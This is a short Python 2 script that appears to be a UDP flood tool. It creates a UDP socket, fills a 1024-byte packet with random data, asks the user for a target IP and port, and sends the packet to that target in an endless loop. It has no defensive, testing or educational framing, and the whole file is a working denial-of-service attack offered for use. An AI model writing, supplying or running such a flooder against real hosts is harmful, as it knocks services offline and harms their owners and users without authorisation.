import socket
import random

#Creates a socket
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

#Creates packet
bytes=random._urandom(1024)

#Target IP
ip=raw_input('Target IP: ')

#Target Port
port=input('Port: ')

while 1:
    sock.sendto(bytes,(ip,port))